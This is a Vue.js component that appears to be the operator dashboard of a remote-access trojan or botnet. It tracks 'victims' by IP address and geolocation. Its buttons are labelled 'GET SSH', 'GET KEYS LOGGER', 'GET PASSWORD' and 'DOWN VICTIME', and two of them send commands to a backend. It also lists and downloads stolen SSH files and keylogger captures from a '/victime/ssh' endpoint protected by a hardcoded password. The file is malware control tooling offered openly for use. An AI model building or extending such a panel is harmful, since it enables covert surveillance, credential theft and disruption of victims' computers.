<template>
  <div class="px-4 sm:px-6 lg:px-8">
    <div class="-mx-4 ring-1 ring-gray-300 sm:mx-0 sm:rounded-lg">
      <table class="min-w-full divide-y divide-gray-300">
        <thead>
          <tr>
            <th
              scope="col"
              :class="[]"
              class="py-3.5 pl-4 pr-3 text-left text-sm font-semibold text-hacker sm:pl-6"
            >
              Id
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              Status
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              IP
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              Country
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              City
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              Latitude
            </th>
            <th
              scope="col"
              class="hidden px-3 py-3.5 text-left text-sm font-semibold text-hacker lg:table-cell"
            >
              Longitude
            </th>
            <th scope="col" class="relative py-3.5 pl-3 pr-4 sm:pr-6">
              <span class="sr-only">Select</span>
            </th>
          </tr>
        </thead>
        <tbody>
          <tr
            v-for="user in usersData"
            :key="user.id"
            class="hover:bg-gray-600"
          >
            <td
              class="border-t border-gray-200 relative py-4 pl-4 px-3 text-sm sm:pl-6 text-left"
            >
              <div class="font-medium text-hacker">
                {{ user.id }}
              </div>
            </td>
            <td
              class="border-t border-gray-200 hidden px-3 py-3.5 text-sm lg:table-cell text-left"
              :class="{
                'text-green-500': user.status === 'on-Line',
                'text-red-500': user.status !== 'on-Line',
              }"
            >
              {{ user.status }}
            </td>
            <td
              class="border-t border-gray-200 hidden px-3 py-3.5 text-sm text-gray-300 lg:table-cell text-left"
            >
              {{ user.ip }}
            </td>
            <td
              class="border-t border-gray-200 hidden px-3 py-3.5 text-sm text-gray-300 lg:table-cell text-left"
            >
              {{ user.pays }}
            </td>
            <td
              class="border-t border-gray-200 hidden px-3 py-3.5 text-sm text-gray-300 lg:table-cell text-left"
            >
              {{ user.ville }}
            </td>
            <td
              class="border-t border-gray-200 hidden px-3 py-3.5 text-sm text-gray-300 lg:table-cell text-left"
            >
              {{ user.latitude }}
            </td>
            <td
              class="border-t border-gray-200 px-3 py-3.5 text-sm text-gray-300 text-left"
            >
              <div class="hidden sm:block">{{ user.longitude }}</div>
            </td>
            <td
              class="border-t border-transparent relative py-3.5 pl-3 pr-4 text-right text-sm font-medium sm:pr-6"
            >
              <button
                @click="showUserDetails(user)"
                type="button"
                class="w-full text-center rounded-md px-2.5 py-1.5 text-sm font-semibold text-hacker shadow-sm ring-1 ring-inset ring-gray-300 hover:ring-hacker disabled:cursor-not-allowed disabled:opacity-30 disabled:hover:bg-white"
              >
                Details
              </button>
              <div class="absolute right-6 left-0 -top-px h-px bg-gray-200" />
            </td>
          </tr>
        </tbody>
      </table>
    </div>
    <TransitionRoot as="template" :show="open">
      <Dialog as="div" class="relative z-10" @close="open = false">
        <TransitionChild
          as="template"
          enter="ease-out duration-300"
          enter-from="opacity-0"
          enter-to="opacity-100"
          leave="ease-in duration-200"
          leave-from="opacity-100"
          leave-to="opacity-0"
        >
          <div
            class="fixed inset-0 bg-gray-500 bg-opacity-75 transition-opacity"
          />
        </TransitionChild>
        <div class="fixed inset-0 z-10 overflow-y-auto">
          <div
            class="flex min-h-full items-end justify-center p-4 text-center sm:items-center sm:p-0"
          >
            <TransitionChild
              as="template"
              enter="ease-out duration-300"
              enter-from="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
              enter-to="opacity-100 translate-y-0 sm:scale-100"
              leave="ease-in duration-200"
              leave-from="opacity-100 translate-y-0 sm:scale-100"
              leave-to="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
            >
              <DialogPanel
                class="relative transform overflow-hidden rounded-lg px-4 pt-5 pb-4 text-left transition-all sm:my-8 sm:w-full sm:max-w-3xl sm:p-6"
              >
                <div
                  v-if="selectedUser"
                  class="mockup-window border bg-base-300 shadow-xl"
                >
                  <div class="flex bg-gray-700">
                    <!-- User Information - Left Side -->
                    <div class="w-1/2 px-4 py-16">
                      <h2 class="text-white text-2xl font-semibold mb-2">
                        User Details
                      </h2>
                      <p><strong>ID:</strong> {{ selectedUser.id }}</p>
                      <p><strong>Status:</strong> {{ selectedUser.status }}</p>
                      <p><strong>IP:</strong> {{ selectedUser.ip }}</p>
                      <p><strong>Country:</strong> {{ selectedUser.pays }}</p>
                      <p><strong>City:</strong> {{ selectedUser.ville }}</p>
                      <p>
                        <strong>Latitude:</strong> {{ selectedUser.latitude }}
                      </p>
                      <p>
                        <strong>Longitude:</strong> {{ selectedUser.longitude }}
                      </p>
                    </div>
                    <!-- Action Buttons - Top Right -->
                    <div class="w-1/2 flex flex-col justify-between px-4 py-8">
                      <div>
                        <h2 class="text-white text-2xl font-semibold mb-2">
                          Actions
                        </h2>
                        <!-- Add more user-friendly and visually appealing action buttons -->
                        <div class="grid grid-cols-2 gap-4">
                          <button
                            @click="performAction1"
                            class="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-md shadow-md"
                          >
                            <span v-if="!loading">GET SSH</span>
                            <span v-else>Loading...</span>
                          </button>
                          <button
                            @click="performAction2"
                            class="bg-green-500 hover:bg-green-600 text-white font-semibold py-3 rounded-md shadow-md"
                          >
                            <span v-if="!loading"> GET KEYS LOGGER</span>
                            <span v-else>Loading...</span>
                          </button>
                          <button
                            class="bg-red-500 hover:bg-red-600 text-white font-semibold py-3 rounded-md shadow-md"
                          >
                            <span v-if="!loading">GET PASSWORD</span>
                            <span v-else>Loading...</span>
                          </button>
                          <button
                            class="bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-3 rounded-md shadow-md"
                          >
                            DOWN VICTIME
                          </button>
                        </div>
                      </div>
                      <div></div>
                    </div>
                  </div>
                  <!-- User Files - Bottom -->
                  <div class="flex flex-col items-center w-full">
                    <div class="bg-gray-700 px-4 py-8 overflow-x-auto w-full">
                      <h2 class="text-white text-2xl font-semibold mb-2">
                        User Files SSH
                      </h2>
                      <div class="flex flex-wrap justify-center">
                        <template
                          v-for="file in selectedUser.sshFiles"
                          :key="file"
                        >
                          <template v-if="file !== 'text.txt'">
                            <a
                              :href="getDownloadLink(selectedUser.id, file)"
                              download
                            >
                              <div
                                class="flex flex-col items-center gap-5 p-4 border border-gray-500 rounded-lg shadow-md mx-4 my-2"
                              >
                                <svg
                                  xmlns="http://www.w3.org/2000/svg"
                                  width="24"
                                  height="24"
                                  viewBox="0 0 24 24"
                                >
                                  <path
                                    d="M11.362 2c4.156 0 2.638 6 2.638 6s6-1.65 6 2.457v11.543h-16v-20h7.362zm.827-2h-10.189v24h20v-14.386c0-2.391-6.648-9.614-9.811-9.614zm4.811 13h-3v-1h3v1zm0 2h-3v1h3v-1zm0 3h-10v1h10v-1zm-5-6h-5v4h5v-4z"
                                  />
                                </svg>
                                <p class="text-gray-300 text-center">
                                  {{ file }}
                                </p>
                              </div>
                            </a>
                          </template>
                        </template>
                      </div>
                    </div>

                    <div class="bg-gray-700 px-4 py-8 overflow-x-auto w-full">
                      <h2 class="text-white text-2xl font-semibold mb-2">
                        Keys Logger
                      </h2>
                      <div class="flex flex-wrap justify-center">
                        <template
                          v-for="file in selectedUser.sshFiles"
                          :key="file"
                        >
                          <template v-if="file === 'text.txt'">
                            <a
                              :href="getDownloadLink(selectedUser.id, file)"
                              download
                            >
                              <div
                                class="flex flex-col items-center p-4 border gap-5 border-gray-500 rounded-lg shadow-md mx-4 my-2"
                              >
                                <svg
                                  xmlns="http://www.w3.org/2000/svg"
                                  width="24"
                                  height="24"
                                  viewBox="0 0 24 24"
                                >
                                  <path
                                    d="M11.362 2c4.156 0 2.638 6 2.638 6s6-1.65 6 2.457v11.543h-16v-20h7.362zm.827-2h-10.189v24h20v-14.386c0-2.391-6.648-9.614-9.811-9.614zm4.811 13h-3v-1h3v1zm0 2h-3v1h3v-1zm0 3h-10v1h10v-1zm-5-6h-5v4h5v-4z"
                                  />
                                </svg>
                                <p class="text-gray-300 text-center">
                                  SuperFile
                                </p>
                              </div>
                            </a>
                          </template>
                        </template>
                      </div>
                    </div>
                  </div>
                </div>

                <div class="mt-5 sm:mt-6 shadow-xl">
                  <button
                    type="button"
                    class="inline-flex w-full justify-center rounded-md bg-gray-700 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-gray-800"
                    @click="open = false"
                  >
                    Exit
                  </button>
                </div>
              </DialogPanel>
            </TransitionChild>
          </div>
        </div>
      </Dialog>
    </TransitionRoot>
  </div>
</template>

<script setup>
import { ref, onBeforeMount } from "vue";
import {
  Dialog,
  DialogPanel,
  TransitionChild,
  TransitionRoot,
} from "@headlessui/vue";
import { getAll, getById, updateStatus } from "@/services/users.js";

const selectedUser = ref(null);
const loading = ref(false);
function showUserDetails(user) {
  selectedUser.value = user;
  open.value = true;
  getUserById(user.id);
}

function performAction1() {
  if (selectedUser.value) {
    loading.value = true; // Activer l'indication de chargement

    updateStatus(selectedUser.value.id, 1)
      .then(() => {
        console.log("Statut mis à jour avec succès !");
      })
      .catch((error) => {
        console.error("Erreur lors de la mise à jour du statut :", error);
      })
      .finally(() => {
        // Utiliser setTimeout pour attendre 5 secondes avant d'appeler showUserDetails
        setTimeout(() => {
          showUserDetails(selectedUser.value);
          loading.value = false; // Désactiver l'indication de chargement
        }, 5000);
      });
  }
}

function performAction2() {
  if (selectedUser.value) {
    loading.value = true; // Activer l'indication de chargement

    updateStatus(selectedUser.value.id, 2)
      .then(() => {
        console.log("Statut mis à jour avec succès !");
      })
      .catch((error) => {
        console.error("Erreur lors de la mise à jour du statut :", error);
      })
      .finally(() => {
        // Utiliser setTimeout pour attendre 5 secondes avant d'appeler showUserDetails
        setTimeout(() => {
          showUserDetails(selectedUser.value);
          loading.value = false; // Désactiver l'indication de chargement
        }, 5000);
      });
  }
}

function getDownloadLink(id, filename) {
  const baseUrl = "http://localhost:8080/victime/ssh?auth=password";
  const queryParams = new URLSearchParams({ id, filename });
  return `${baseUrl}&${queryParams.toString()}`;
}

const open = ref(false);
const usersData = ref([]);

onBeforeMount(async () => {
  await updateUser();
});

async function updateUser() {
  const response = await getAll();
  usersData.value = response;
}

async function getUserById(id) {
  const response = await getById(id);
  selectedUser.value = { ...selectedUser.value, ...response };
}
</script>
